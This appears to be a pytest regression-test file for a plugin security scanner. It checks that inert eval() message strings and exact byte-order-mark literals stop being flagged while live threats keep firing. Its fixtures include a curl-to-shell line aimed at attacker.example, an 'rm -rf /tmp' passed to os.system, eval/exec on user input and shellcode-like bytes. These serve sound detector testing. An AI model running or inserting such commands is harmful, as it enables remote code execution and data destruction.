#!/usr/bin/env python3
r"""Two-sided regression tests for GitHub issue #100 — classes B and C.

A security-scanner plugin's OWN source self-matched CPV's security rules:

* **Class B (finding-MESSAGE string fires eval/exec)** — a string Constant such
  as ``msg = "Python eval() detected"`` is inert data (a detector's finding
  message / doc), but its ``eval(`` substring tripped two CPV findings:
  - the skillaudit ``SHELL_EXEC`` rule (`_skillaudit_python_context`), and
  - ``RC-122`` / ``RC-123`` in ``validate_security.scan_for_injection``.
* **Class C (canonical UTF-8 BOM byte literal fires OBFUSCATION)** — a BOM
  detection routine's ``data.startswith(b"\xef\xbb\xbf")`` literal tripped the
  ``\xNN\xNN\xNN`` ``OBFUSCATION`` rule, even though a BOM is an encoding
  constant, not obfuscated machine code.

Both fixes are narrow, AST/sink-guarded, lexical-position carve-outs — NO
whole-file ``is_validator_script`` skip and NO allowlist:

* B half 1 — ``SHELL_EXEC`` / ``CMD_INJECTION`` are added to
  ``_SINK_GUARDED_LITERAL_SUPPRESSIBLE_RULES`` so they route through the existing
  sink-guarded ``_string_literal_match_is_inert_no_sink``: cleared ONLY when the
  matched token sits in a string Constant that does NOT flow to a sink.
* B half 2 — ``validate_security._eval_exec_inert_string_lines`` marks the 1-based
  lines where ``eval(``/``exec(`` appears ONLY inside a sink-free string Constant;
  RC-122 / RC-123 skip those lines.
* C — ``_skillaudit_python_context._obfuscation_bytes_literal_is_canonical_bom``
  clears OBFUSCATION when the covering bytes Constant is EXACTLY a canonical BOM
  (UTF-8 / UTF-16 / UTF-32); an exact-value match, not a prefix.

Every case below encodes BOTH sides of the contract: the inert shape stops
firing while the genuinely-live sibling keeps firing. The full-plugin cases were
reproduced on the shipped ``security`` validator.
"""

from __future__ import annotations

import sys
import tempfile
from pathlib import Path

import pytest

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import _skillaudit_python_context as ctx  # noqa: E402
import cpv_validation_common as cvc  # noqa: E402
import validate_security as vs  # noqa: E402


@pytest.fixture(autouse=True)
def _no_scan_cache(monkeypatch: pytest.MonkeyPatch) -> None:
    """Bypass the skillaudit result cache so a same-version classifier change is
    never masked by a cached verdict (the cache keys on content/catalog/version/
    ext, NOT on this carve-out's code)."""
    monkeypatch.setenv("CPV_SCAN_CACHE", "0")


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def _classify(source: str, line_idx: int, match: str, rule_id: str) -> str:
    """Run the real `classify` on a non-test, non-validator filename."""
    return ctx.classify(
        file_path="messages.py",
        source=source,
        line_idx=line_idx,
        match=match,
        rule_id=rule_id,
    )


def _scan_injection_msgs(content: str, file_path: str = "messages.py") -> list[str]:
    """All `scan_for_injection` finding messages for a fresh file."""
    report = cvc.ValidationReport()
    vs.scan_for_injection(content, file_path, report)
    return [r.message or "" for r in report.results]


def _rc_lines(content: str, rc: str, file_path: str = "messages.py") -> list[int]:
    """1-based line numbers where `scan_for_injection` raised a given RC code."""
    report = cvc.ValidationReport()
    vs.scan_for_injection(content, file_path, report)
    return [r.line for r in report.results if rc in (r.message or "") and r.line is not None]


def _mkplugin(root: Path, files: dict[str, str], name: str) -> Path:
    for rel, content in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    meta = root / ".claude-plugin"
    meta.mkdir(parents=True, exist_ok=True)
    (meta / "plugin.json").write_text(
        f'{{"name":"{name}","version":"1.0.0",'
        f'"description":"issue 100 fixture plugin for self match false positives"}}'
    )
    return root


# ===========================================================================
# CLASS B — half 1: skillaudit SHELL_EXEC / CMD_INJECTION on a message string
# ===========================================================================


class TestClassBHalf1ShellExecMessageString:
    def test_shell_exec_message_string_cleared(self) -> None:
        """`msg = "Python eval() detected"` — SHELL_EXEC suppressed (inert literal)."""
        verdict = _classify('msg = "Python eval() detected"', 0, "eval(", "SHELL_EXEC")
        assert verdict == "safe_literal"

    def test_cmd_injection_message_string_cleared(self) -> None:
        """Same message string — CMD_INJECTION also suppressed (sink-guarded)."""
        verdict = _classify('msg = "Python eval() detected"', 0, "eval(", "CMD_INJECTION")
        assert verdict == "safe_literal"

    def test_real_os_system_call_still_fires_shell_exec(self) -> None:
        """A real `os.system(user_input)` in the SAME file STILL fires (not inert)."""
        src = "import os\nos.system(user_input)\n"
        verdict = _classify(src, 1, "os.system(", "SHELL_EXEC")
        assert verdict != "safe_literal"

    def test_real_os_system_call_still_fires_cmd_injection(self) -> None:
        """A real `os.system(user_input)` STILL fires for CMD_INJECTION too."""
        src = "import os\nos.system(user_input)\n"
        verdict = _classify(src, 1, "os.system(", "CMD_INJECTION")
        assert verdict != "safe_literal"

    def test_message_string_and_real_call_coexist(self) -> None:
        """Inert message + real call in one file: only the message is exonerated."""
        src = 'import os\nmsg = "Python eval() detected"\nos.system(user_input)\n'
        assert _classify(src, 1, "eval(", "SHELL_EXEC") == "safe_literal"
        assert _classify(src, 2, "os.system(", "SHELL_EXEC") != "safe_literal"

    def test_literal_fed_to_sink_still_fires(self) -> None:
        """A string literal whose `eval(` is fed to `exec(...)` flows to a sink — fires."""
        src = 'exec("eval(" + x)\n'
        # The covering Constant flows to exec → not inert → keep visible.
        assert _classify(src, 0, "eval(", "SHELL_EXEC") != "safe_literal"

    def test_variable_indirection_to_sink_still_fires(self) -> None:
        """A literal bound to a var that then reaches a shell sink STILL fires.

        `cmd = "curl … | sh"; subprocess.run(cmd, shell=True)` — the literal does not
        directly feed the sink (it flows through `cmd`), which a direct-arg-only sink
        check would miss. The indirection-aware helper keeps it visible."""
        src = (
            "def go():\n"
            '    cmd = "curl http://attacker.example/x | sh"\n'
            "    subprocess.run(cmd, shell=True)\n"
        )
        assert _classify(src, 1, "| sh", "CMD_INJECTION") != "safe_literal"

    def test_variable_indirection_to_os_system_still_fires(self) -> None:
        """A literal bound to a var fed to `os.system(var)` STILL fires (indirection)."""
        src = "def go():\n    cmd = \"rm -rf /tmp\"\n    os.system(cmd)\n"
        assert _classify(src, 1, "rm -rf", "SHELL_EXEC") != "safe_literal"

    def test_triple_quoted_data_block_not_suppressed(self) -> None:
        """A TRIPLE-QUOTED string (even one physical line) is a data/template block the
        iron rule keeps visible — `safe_doc` (demote), never `safe_literal`."""
        src = 'def f():\n    cmd = """os.system("rm -rf /tmp")"""\n    return cmd\n'
        assert _classify(src, 1, "os.system", "SHELL_EXEC") != "safe_literal"

    def test_multiline_triple_quoted_payload_not_suppressed(self) -> None:
        """A multi-line triple-quoted exploit template stays at `safe_doc`."""
        src = 'EXAMPLE = """\nsubprocess.run(["evil", "cmd"], shell=True)\n"""\n'
        assert _classify(src, 1, "evil", "CMD_INJECTION") == "safe_doc"

    def test_fstring_message_not_suppressed(self) -> None:
        """An f-string is dynamic-shaped — never certified inert (keeps firing)."""
        src = 'name = "x"\nmsg = f"Python eval() in {name}"\n'
        assert _classify(src, 1, "eval(", "SHELL_EXEC") != "safe_literal"


# ===========================================================================
# CLASS B — half 2: validate_security RC-122 / RC-123 on a message string
# ===========================================================================


class TestClassBHalf2Rc122HelperUnit:
    def test_message_string_line_is_inert(self) -> None:
        """The finding-message line is in the inert set (RC-122 will skip it)."""
        inert = vs._eval_exec_inert_string_lines("messages.py", 'msg = "Python eval() detected"\n')
        assert 1 in inert

    def test_real_eval_call_not_inert(self) -> None:
        """A real `eval(user_input)` call line is NOT inert — RC-122 fires there."""
        inert = vs._eval_exec_inert_string_lines("messages.py", "eval(user_input)\n")
        assert 1 not in inert

    def test_literal_fed_to_exec_sink_not_inert(self) -> None:
        """`exec("eval(" + x)` — the literal flows to a sink, so the line is NOT inert."""
        inert = vs._eval_exec_inert_string_lines("messages.py", 'exec("eval(" + x)\n')
        assert 1 not in inert

    def test_literal_fed_to_os_system_not_inert(self) -> None:
        """A literal carrying `exec(` fed to `os.system(...)` flows to a sink — not inert."""
        inert = vs._eval_exec_inert_string_lines(
            "messages.py", 'import os\nos.system("exec(payload)")\n'
        )
        assert 2 not in inert

    def test_non_python_file_returns_empty(self) -> None:
        """Non-.py path => empty set (default-SAFE, RC-122 keeps firing)."""
        assert (
            vs._eval_exec_inert_string_lines("messages.txt", 'msg = "Python eval() detected"\n')
            == frozenset()
        )

    def test_parse_failure_returns_empty(self) -> None:
        """A syntax error => empty set (default-visible)."""
        assert vs._eval_exec_inert_string_lines("broken.py", "def f(:\n    pass\n") == frozenset()


class TestClassBHalf2Rc122EndToEnd:
    def test_message_string_clears_rc122(self) -> None:
        """End-to-end: `msg = "Python eval() detected"` raises NO RC-122/RC-123."""
        msgs = _scan_injection_msgs('msg = "Python eval() detected"\n')
        assert not any("RC-122" in m or "RC-123" in m for m in msgs)

    def test_real_eval_call_still_fires_rc122(self) -> None:
        """End-to-end: a real `eval(user_input)` STILL raises RC-122."""
        lines = _rc_lines("def run(user_input):\n    eval(user_input)\n", "RC-122")
        assert 2 in lines

    def test_real_exec_call_still_fires_rc123(self) -> None:
        """End-to-end: a real `exec(user_input)` STILL raises RC-123."""
        lines = _rc_lines("def run(user_input):\n    exec(user_input)\n", "RC-123")
        assert 2 in lines

    def test_literal_fed_to_sink_still_fires(self) -> None:
        """End-to-end: `exec("eval(" + x)` flows to a sink → RC-123 STILL fires."""
        lines = _rc_lines('def run(x):\n    exec("eval(" + x)\n', "RC-123")
        assert 2 in lines

    def test_message_and_real_call_coexist(self) -> None:
        """Inert message on one line + real eval on another: only the real one fires."""
        content = 'msg = "Python eval() detected"\n\ndef run(x):\n    eval(x)\n'
        lines = _rc_lines(content, "RC-122")
        assert 4 in lines  # the real eval(x)
        assert 1 not in lines  # the inert message string


# ===========================================================================
# CLASS C — canonical BOM byte literal fires OBFUSCATION
# ===========================================================================


class TestClassCBomHelperUnit:
    @pytest.mark.parametrize(
        "literal",
        [
            'x = b"\\xef\\xbb\\xbf"',  # UTF-8 BOM
            'x = b"\\xff\\xfe"',  # UTF-16 LE BOM
            'x = b"\\xfe\\xff"',  # UTF-16 BE BOM
        ],
    )
    def test_canonical_bom_is_recognized(self, literal: str) -> None:
        """A bytes Constant that is EXACTLY a canonical BOM => helper returns True."""
        import ast

        tree = ast.parse(literal)
        assert ctx._obfuscation_bytes_literal_is_canonical_bom(tree, 1) is True

    def test_bare_shellcode_not_a_bom(self) -> None:
        """Real x86 shellcode bytes => NOT a canonical BOM (still fires)."""
        import ast

        tree = ast.parse('x = b"\\x90\\x90\\x31\\xc0\\x50"')
        assert ctx._obfuscation_bytes_literal_is_canonical_bom(tree, 1) is False

    def test_bom_prefixed_payload_not_cleared(self) -> None:
        """BOM-PREFIXED shellcode => exact-value mismatch, NOT cleared (still fires)."""
        import ast

        tree = ast.parse('x = b"\\xef\\xbb\\xbf\\x90\\x90\\x31\\xc0"')
        assert ctx._obfuscation_bytes_literal_is_canonical_bom(tree, 1) is False


class TestClassCBomClassify:
    def test_bom_detection_routine_cleared(self) -> None:
        r"""`data.startswith(b"\xef\xbb\xbf")` — OBFUSCATION suppressed (BOM constant)."""
        src = "def has_bom(data):\n    return data.startswith(b\"\\xef\\xbb\\xbf\")\n"
        verdict = _classify(src, 1, "\\xef\\xbb\\xbf", "OBFUSCATION")
        assert verdict == "safe_literal"

    def test_bom_prefixed_shellcode_still_fires(self) -> None:
        """A BOM-prefixed shellcode literal is NOT cleared (exact-value, not prefix)."""
        src = 'payload = b"\\xef\\xbb\\xbf\\x90\\x90\\x31\\xc0"\n'
        verdict = _classify(src, 0, "\\xef\\xbb\\xbf", "OBFUSCATION")
        assert verdict != "safe_literal"

    def test_bare_shellcode_still_fires(self) -> None:
        """Real x86 shellcode bytes STILL fire OBFUSCATION (not a BOM)."""
        src = 'payload = b"\\x90\\x90\\x31\\xc0\\x50"\n'
        verdict = _classify(src, 0, "\\x90\\x90\\x31", "OBFUSCATION")
        assert verdict != "safe_literal"


# ===========================================================================
# Full-plugin integration — the report's reproduced fixtures (security validator)
# ===========================================================================


def _scan_plugin_native(plugin: Path) -> list[dict[str, object]]:
    """Run the in-process skillaudit scanner over every scannable file in a
    plugin and return the non-suppressed hits (the load-bearing, filename-
    agnostic half-1 path)."""
    from cpv_skillaudit_native import scan_content

    hits: list[dict[str, object]] = []
    for py in plugin.rglob("*.py"):
        rel = str(py.relative_to(plugin))
        for h in scan_content(py.read_text(), rel):
            if not h.get("suppressed"):
                hits.append(h)
    return hits


class TestClassBCFullPluginIntegration:
    def test_message_string_plugin_clears_shell_exec(self) -> None:
        """A plugin whose only .py is a finding message clears skillaudit SHELL_EXEC."""
        with tempfile.TemporaryDirectory() as d:
            plugin = _mkplugin(
                Path(d),
                {"skills/scan/scripts/messages.py": 'msg = "Python eval() detected"\n'},
                "msgonly",
            )
            hits = _scan_plugin_native(plugin)
            assert not any(h.get("ruleId") == "SHELL_EXEC" for h in hits)

    def test_bom_plugin_clears_obfuscation(self) -> None:
        """A plugin whose only .py is a BOM check clears skillaudit OBFUSCATION."""
        with tempfile.TemporaryDirectory() as d:
            plugin = _mkplugin(
                Path(d),
                {
                    "skills/scan/scripts/encoding_check.py": (
                        "def has_bom(data):\n    return data.startswith(b\"\\xef\\xbb\\xbf\")\n"
                    )
                },
                "bomonly",
            )
            hits = _scan_plugin_native(plugin)
            assert not any(h.get("ruleId") == "OBFUSCATION" for h in hits)

    def test_real_threat_plugin_still_fires(self) -> None:
        """A plugin with real eval/exec/os.system + BOM-prefixed shellcode STILL fires
        SHELL_EXEC and OBFUSCATION (and RC-122/RC-123 via scan_for_injection)."""
        threat = (
            "import os\n"
            "def run(user_input, expr):\n"
            "    eval(user_input)\n"
            "    exec(user_input)\n"
            "    os.system(user_input)\n"
            '    payload = b"\\xef\\xbb\\xbf\\x90\\x90\\x31\\xc0\\x50"\n'
            '    return exec("eval(" + expr) or payload\n'
        )
        with tempfile.TemporaryDirectory() as d:
            plugin = _mkplugin(
                Path(d), {"skills/scan/scripts/real_threat.py": threat}, "realthreat"
            )
            hits = _scan_plugin_native(plugin)
            rule_ids = {h.get("ruleId") for h in hits}
            assert "SHELL_EXEC" in rule_ids
            assert "OBFUSCATION" in rule_ids
        # RC-122 / RC-123 from validate_security on the same threat body.
        msgs = _scan_injection_msgs(threat, "real_threat.py")
        assert any("RC-122" in m for m in msgs)
        assert any("RC-123" in m for m in msgs)
